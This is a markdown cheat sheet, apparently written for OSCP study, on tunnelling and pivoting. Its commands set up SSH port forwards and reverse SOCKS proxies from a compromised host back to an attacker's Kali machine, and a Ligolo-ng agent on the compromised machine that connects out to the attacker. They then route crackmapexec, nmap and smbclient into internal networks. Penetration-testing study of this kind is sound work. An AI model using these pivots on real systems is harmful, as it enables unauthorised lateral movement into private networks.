# Tunneling and stuff

![krieger-tick](https://github.com/Br14n41/oscp-stuffs/assets/57382125/5515478d-515a-4d9f-b321-ba98e89eafb3)

## SSH

```bash
# TOR port
ssh pwned@target -i id_rsa -D 9050 

# Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
# Example
proxychains4 crackmapexec smb TARGET 

# Instruct SSH to listen on all interfaces on port 4455 from the compromised host (0.0.0.0:4455),
# then forward all packets to port 445 on the newly-found host (INTERNAL:445).
ssh -N -L 0.0.0.0:4455:INTERNAL:445 user@COMPROMISED

# An example of using the new tunnel
# SMBClient traffic to COMPROMISED:4455 is forwarded to INTERNAL:445, so...
smbclient -p 4455 -L //192.168.1.3/ -U admin --password=Welcome123!

# Dynamic port forwarding
# In OpenSSH, a dynamic port forward is created with the -D option. 
# The -D option takes the IP address and port to bind to. 
# In this case, we want it to listen on all interfaces on port 9999. 
# We don't need to specify a socket address to forward to. 
# The -N flag is used to prevent a shell from being spawned.
# On COMPROMISED...
ssh -N -D 0.0.0.0:9999 user@COMPROMISED

# Remote port forwarding
# Run on COMPROMISED to create an SSH remote port forward as part of an SSH connection back to Kali
# The remote port forward option is -R, with the listening socket defined first and the forwarding socket next.
# Example 1: listen on port 2345 on our Kali machine (127.0.0.1) and forward all traffic to the target machine.
ssh -N -R 127.0.0.1:2345:TARGET:5432 adversary@KALI

# Example 2: open remote port forward through a perimeter machine to open traffic from Kali to INTERNAL
sudo ssh -N -R INTERNAL:7781:EXTERNAL:18890 adversary@KALI 

# Remote dynamic port forwarding, run from COMPROMISED
ssh -N -R 9998 adversary@KALI
# Add line to proxychains
sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
# Example of usage:
proxychains nmap -vvv -sT --top-ports=20 -Pn -n INTERNAL
```

## Ligolo-ng

```bash
# Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Kali machine - Attacker machine (I have proxy placed into /usr/bin)
proxy -selfcert

# To manually set port
proxy -laddr 0.0.0.0:9001 -selfcert

# windows or linux machine - compromised machine
agent.exe -connect LHOST:PORT -ignore-cert -retry

# In Ligolo-ng console
# select host
session
# Notedown the internal network's subnet
ifconfig
# after adding relevent subnet to ligolo interface
start_tunnel

# Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo

```
